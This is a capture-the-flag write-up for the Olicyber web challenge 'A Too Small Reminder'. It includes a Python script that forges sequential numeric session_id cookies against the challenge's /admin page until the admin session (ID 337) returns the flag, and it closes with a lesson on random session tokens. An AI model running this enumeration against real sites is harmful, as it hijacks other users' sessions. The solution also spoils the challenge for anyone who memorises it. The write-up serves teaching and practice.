---
title: "A Too Small Reminder — Session ID Enumeration"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "idor", "session", "brute-force", "python"]
difficulty: "beginner"
summary: "Register, log in, notice the session_id cookie is a small integer. Brute-force integers upward from 30 until the admin session is hit and the flag appears."
---

## The Challenge

A simple reminder app. After registration and login you get a numeric `session_id` cookie. The server does not validate ownership — any valid session integer grants access to the profile at `/admin`.

## Approach

Register and log in to observe the assigned session ID (a small integer). Admin's session ID is also a small integer. Iterating from 30 upward and checking each `/admin` response for the word "flag" hits the admin session at ID 337.

## Solution

```python
import requests
site = "http://too-small-reminder.challs.olicyber.it"
s = requests.Session()
header = {'Content-Type': 'application/json'}
r = s.post(f"{site}/register", headers=header, data='{"username":"xxxxx11", "password":"s123"}')
r1 = s.post(f"{site}/login", headers=header, data='{"username":"xxxxx11", "password":"s123"}')

print(r.text)

print(r1.cookies.get_dict()) 

for i in range(30, int(10e8)): # is 337!
    r = requests.get(f"{site}/admin", cookies={"session_id":f"{i}"})
    if "flag" in r.text.lower():
        print(r.text)
        break
    else:
        print(r.text.replace("\n", "") + str(i))
```

Registration + login establishes a baseline cookie to confirm the format. The loop forges the `session_id` cookie with increasing integers. The comment `# is 337!` reveals the admin's session number. The loop exits as soon as the response contains "flag".

## What I Learned

Sequential numeric session IDs are an IDOR vulnerability by design. Any attacker who can observe their own ID can enumerate adjacent ones. Session tokens must be cryptographically random and long enough to make brute force infeasible.
